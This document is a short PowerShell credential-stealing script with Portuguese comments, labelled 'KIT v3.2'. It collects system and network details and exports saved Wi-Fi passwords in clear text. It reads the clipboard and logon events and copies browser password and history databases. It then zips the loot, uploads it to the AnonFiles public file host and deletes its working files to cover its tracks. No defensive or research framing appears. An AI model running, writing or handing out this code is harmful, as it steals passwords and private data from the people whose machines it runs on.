# KIT v3.2 – AnonFiles, 20 GB max, PS 7.5.4, sem elevação
$kit="$env:TEMP\k"; ni -ItemType Directory $kit -Force |Out-Null

# 1) TXT leves
systeminfo |Out-File $kit\sys.txt -Encoding UTF8
Get-CimInstance Win32_ComputerSystem |Out-File $kit\hw.txt -Encoding UTF8
Get-CimInstance Win32_Processor |Out-File $kit\hw.txt -Append -Encoding UTF8
Get-CimInstance Win32_BIOS |Out-File $kit\hw.txt -Append -Encoding UTF8
Get-NetIPConfiguration |Out-File $kit\net.txt -Encoding UTF8
netsh wlan export profile key=clear folder=$kit |Out-Null
Get-CimInstance Win32_UserAccount |Out-File $kit\usr.txt -Encoding UTF8
net localgroup administradores |Out-File $kit\adm.txt -Encoding UTF8
Get-WinEvent -FilterHashtable @{LogName='Security';ID=4624} -Max 100 -EA 0|Select TimeCreated,Message |Out-File $kit\log.txt -Encoding UTF8
Get-Clipboard |Out-File $kit\clip.txt -Encoding UTF8
Get-ChildItem $env:APPDATA\Microsoft\Windows\Recent -Name |Out-File $kit\rec.txt -Encoding UTF8

# 2) Navegadores
@('Login Data','History','logins.json')| %{
  Get-ChildItem $env:LOCALAPPDATA,$env:APPDATA -Recurse -File -Filter $_ -EA 0|Select -First 1| %{
    if(Test-Path $_.FullName){Copy-Item $_.FullName "$kit\$($_.Name)" -EA 0}
  }
}

# 3) Certificados
Get-ChildItem Cert:\CurrentUser\My|Select Subject,Thumbprint,NotAfter |Out-File $kit\certs.txt -Encoding UTF8

# 4) ZIP
Compress-Archive $kit "$env:TEMP\k.zip" -CompressionLevel Optimal

# 5) Upload AnonFiles
$file=Get-Item "$env:TEMP\k.zip"
$uri="https://api.anonfiles.com/upload"
try{
  $boundary=[System.Guid]::NewGuid().ToString()
  $lf="`r`n"
  $body=(
    "--$boundary$lf"+
    "Content-Disposition: form-data; name=`"file`"; filename=`"$($file.Name)`"$lf"+
    "Content-Type: application/octet-stream$lf$lf"+
    [System.IO.File]::ReadAllBytes($file.FullName)+
    "$lf--$boundary--$lf"
  )
  $bytes=[System.Text.Encoding]::UTF8.GetBytes($body)
  $resp=Invoke-RestMethod -Uri $uri -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bytes
  # devolve a URL pública
  $resp.data.file.url.full
}catch{
  $_.Exception.Message
}

# 6) Limpa
Remove-Item $kit -Recurse -Force; Remove-Item $file -Force
